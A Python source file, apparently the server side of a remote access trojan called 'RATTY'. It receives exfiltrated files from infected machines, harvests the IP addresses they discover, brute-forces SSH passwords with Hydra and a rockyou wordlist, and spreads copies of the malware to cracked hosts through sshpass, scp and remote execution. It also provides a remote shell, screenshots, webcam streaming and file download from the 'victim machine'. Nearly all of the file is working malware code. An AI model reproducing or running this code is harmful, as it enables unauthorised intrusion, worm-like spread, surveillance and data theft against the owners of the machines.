#!/usr/bin/env python3

import ipaddress
import socket
import pyfiglet
import json
import base64
import sys
import time
from datetime import datetime
import subprocess
import os



class SERVER:
    # initialize the server
    def __init__(self, host, port):
        self.host = host
        self.port = port
    # building the connection with the client using socket

    def connection(self):
        # setting global variables to use for the connection and subsequent functions.
        global client, addr, sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # providing host and port to bind the connection
        sock.bind((self.host, self.port))
        # marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept()
        sock.listen(5)
        print('Establishing connection with the client')
        # accepting the connection and setting client and addr variable values to the connection values
        client, addr = sock.accept()
        print('Accepting connection with client...')
        # decoding ipv4 to print the connection IP address
        clientip = client.recv(1024).decode()
        print(f'Connection established with {clientip}')

    def CompromisedExfil(self):
        json_data = client.recv(1024).decode()
        convert_json = json.loads(json_data)
        name = convert_json['name']
        bytes = convert_json['data']
        b64decoded_bytes = base64.b64decode(bytes)
        file_name = name.split('.')
        file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}",'wb') #open in binary       
        # #         # receive data and write it to file
        file.write(b64decoded_bytes)
        file.close()

    def ParsePCFiles(self):
        allDiscoveredIPs = []
        fileList = os.listdir(".") # find all files in folder
        for file in fileList:
            if file.endswith(".pc"): #if that file is a .pc file uploaded from malware
                print ("Checking File: " + file)
                with open(file, 'r') as thisFile:#open file
                    for line in thisFile: # check lines
                        if "Discovered IP address:" in line: #if we find a discovered IP address
                            allDiscoveredIPs.append(line.strip()) #write to the list of discovered IP addresses

        #print("Discovered IPS: " + str(allDiscoveredIPs))
        #create file of target PCs
        #check if IP is already on the list and only add them if it is not in list
        existingIPAddresses = []

        #create file if needed
        fileName = "targetPCs.txt"
        targetFile = open(fileName,'a') 
        targetFile.close()
        
        # open file and check IPs that are already there
        with open(fileName, 'r') as f:
            for line in f:
                existingIPAddresses.append(line.strip())

        #open file and append IP addresses that are not in file
        with open(fileName, 'a') as f:
            for i in range(len(allDiscoveredIPs)):
                if allDiscoveredIPs[i] not in existingIPAddresses:
                    f.write(allDiscoveredIPs[i] + '\n')

        

    def RunHydra(self):
        #check the available targets file for IP addresses and checks that against all .pc files ip addresses.
        #if .pc file for that computer/ip address does not exist or contain a password or a 'hydra attempt' it will run hydra and run write results to targetPCs.txt
        print("running hydra")

        #get list of targets
        with open("targetPCs.txt") as targetFile:
            discoveredIPs = []
            for line in targetFile:
                discoveredIPs.append(line.strip())
        #print(discoveredIPs)

        pcList = {}
        fileList = os.listdir(".") # find all files in folder
        for file in fileList:
            if file.endswith(".pc"): #if that file is a .pc file uploaded from malware
                print ("Checking File: " + file)
                with open(file) as thisFile: #open the file and parse hostname and IP data into a dict if it does not contain a password or hydra attempt
                    if 'password' in open(file).read() or 'Hydra' in open(file).read():
                        print("password or hydra attempt in file: " + file)
                    else:
                        for line in thisFile: # if the file does not have a hydra or password entry, add to dict
                            if "Hostname: " in line:
                                pcList[file.strip()]
                            if "IP Address:" in line:                       
                                #print(line[11:].strip())
                                pcList[file.strip()] = str(line[11:].strip())
                                

        #run hydra for each PC that still needs an attempt
        for key, value in pcList.items():
            print(key + " " + value)
            hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', f"ssh://{value}"],capture_output=True)

            
            #parse hydra data and write password to file
            passIndex = str(hResult.stdout).find("password:") + 10 # get index of location of 'password: ' in results
            password = str(hResult.stdout)[passIndex:]
            endIndex = password.find("1 of 1") #find end of password
            password = password[0:endIndex-2]
            print("Hydra found password is : " + password)

            with open(key, 'a') as thisFile:
                thisFile.write('\n'+ 'password: ' + password)   



    def MalSpread(self):
        # fileList = os.listdir(".")
        # for file in fileList:
        #     if file.endswith(".pc"):
        #         with open(file) as thisFile:
        #             for line in thisFile:
        #                 thisIP = '192.168.56.115'
        #                 thisPass = 'rockyou!'
        #                 if 'password' in line:

        #                     print("spread attempt")
        #                     #addSSHResult = subprocess.run(["ssh-keyscan", "-H", thisIP, ">>", "~/.ssh/known_hosts" ],capture_output=True)
        #                     #print(addSSHResult.stdout)
        #                     #print(addSSHResult.stderr)

        #                     transResult = subprocess.run(["sshpass", "-p", thisPass, "scp", "./malware-pc3.py", "user1@192.168.56.115:/home/user1/Desktop/"],capture_output=True)
        #                     #print(transResult.stdout)
        #                     #print(transResult.stderr)

        #                     malExecResult = subprocess.run(["sshpass", "-p", thisPass, "ssh", "user1@192.168.56.115", "/home/user1/Desktop/malware-pc3.py"],capture_output=True)
        #                     print(malExecResult.stdout)
        #                     print(malExecResult.stderr)

        #check files to see if we have already have a password, if we have not already compromised a PC, then tries to compromise if true
        print("spreading malware")
        malTarget = {}
        fileName = "targetPCs.txt"
        fileList = os.listdir(".")
        for file in fileList:
            if file.endswith(".pc"):
                with open(file) as thisFile:
                    if 'malware' not in open(file).read() and 'password' in open(file).read(): #if we do not already have malware installed and we do have the password
                        pcName = file[0:-3]
                        thisIP = ''
                        thisPass = ''
                        for line in thisFile:
                            if "IP Address:" in line:
                                thisIP = line[11:].strip()
                            if "password" in line:
                                thisPass = line[9:].strip()
                        print(thisIP + " " +thisPass)
                    
                        transResult = subprocess.run(["sshpass", "-p", f"{thisPass}", "scp", f"./malware-{pcName}.py", f"user1@{thisIP}:/home/user1/Desktop/"],capture_output=True)
                        #print(transResult.stdout)
                        #print(transResult.stderr)

                        malExecResult = subprocess.Popen(["sshpass", "-p", f"{thisPass}", "ssh", f"user1@{thisIP}", f"/home/user1/Desktop/malware-{pcName}.py"])
                        # print(malExecResult.stdout)
                        # print(malExecResult.stderr)
    
    # setting up function for webcam accessability for later uses
    def vidstream_server(self):
        try:
            from vidstream import StreamingServer
            global server
            # giving the vidstream server the attacking machine as the host and setting the port to 8080
            server = StreamingServer(self.host, 8080)
            # starting the vidstream server
            server.start_server()
        except:
            print("Vidstream module not installed")
            
    # function to stop the vidstream server       
    def stop_vidstream(self):
        server.stop_vidstream()
    
    # handling user input for the commands later on in the program. Needed to be encoded
    def send_data(self):
        client.send(command.encode())
        data_output = client.recv(1024).decode()
        print(data_output)

    def sendmessage(self):
        client.send(command.encode())
        message = str(input('What would you like to say: '))
        client.send(message.encode())
        print('Message Sent!')
    
    
    def screenshot(self, command):
        client.send(command.encode())
        data_len = client.recv(1024).decode()
        time.sleep(1)
        bytes = bytearray()
        while len(bytes) <= int(data_len) - 1:
            data = client.recv(1)
            bytes.extend(data)
        dt = datetime.now()
        ts = datetime.timestamp(dt)
        filename = 'screenshot' + str(ts) + '.png'
        with open(filename, 'wb') as open_file:
            open_file.write(bytes)
            open_file.close()
        self.progressbar()
        print("Screenshot Downloaded!")
        
    def download(self):
        try:
            json_data = client.recv(600000).decode()
            convert_json = json.loads(json_data)
            name = convert_json['name']
            bytes = convert_json['data']
            b64decoded_bytes = base64.b64decode(bytes)
            if '.' in name:
                file_name = name.split('.')
                # open in binary
                file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}", 'wb')
                # receive data and write it to file
                file.write(b64decoded_bytes)
                self.progressbar()
                print('File downloaded!')
                file.close()
            else:
                file = open(str(name), "wb")
                file.write(b64decoded_bytes)
                self.progressbar()
                print("File downloaded!")
                file.close()
        except:
            err = "file doesn't exist, check your spelling/extension"
            print(err)
                                  
    
    def progressbar(self):
        toolbar_width = 40

        # setup toolbar
        sys.stdout.write("[%s]" % (" " * toolbar_width))
        sys.stdout.flush()
        # return to start of line, after '['
        sys.stdout.write("\b" * (toolbar_width+1))

        for i in range(toolbar_width):
            time.sleep(0.01)  # do real work here
            # update the bar
            sys.stdout.write("-")
            sys.stdout.flush()

        sys.stdout.write("]\n")  # this ends the progress bar

    # logo for the RAT
    def rattylogo(self):
        logo = pyfiglet.figlet_format("Ratty")
        print(logo)
        print('\n \n ====================================================================== \n \n \n \n Welcome to RATTY, your neighborhood remote administraion tool \n \n')

    # prompts given to the user to run commands in the cli
    def prompts(self):
        print('============================== Commands: ============================== \n \n shell                         makes a shell to interact with victim machine \n sendmessage                   sends message to client machine \n upload                        uploads file \n screenshot                    takes a screenshot of victim machine \n help                          show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')

    def shellhelp(self):
        print("To download a file from the client's computer, type: download <file_name_with_extension>")

    def mainloop(self):
        self.rattylogo()
        self.prompts()
        while True:
            global command
            command = input('RATTY >>> ')

            match command:
                case 'shell':
                    client.send(command.encode())
                    self.shellhelp()
                    while True:
                        command = str(input('$ '))
                        client.send(command.encode())
                        if command == 'exit':
                            break
                        elif command == '':
                            continue
                        elif command[:2] == 'rm':
                            continue
                        elif command[:5] == 'touch':
                            continue
                        elif command[:5] == 'mkdir':
                            continue
                        elif command[:5] == 'rmdir':
                            continue
                        if command[:8] == 'download':
                            self.download()
                            continue
                        data_output = client.recv(1024).decode()
                        print(data_output)

                case 'screenshot':
                    self.screenshot(command)

                case 'sendmessage':
                    self.sendmessage()

                case 'upload':
                    self.upload()

                case 'help':
                    self.prompts()

                case 'exit':
                    self.exit()

# setting host port and ip to construct with the server class
rat = SERVER('0.0.0.0', 4442)


if __name__ == '__main__':
    rat.connection()
    rat.CompromisedExfil()
    rat.ParsePCFiles()
    rat.RunHydra()
    #rat.MalSpread()
    rat.mainloop()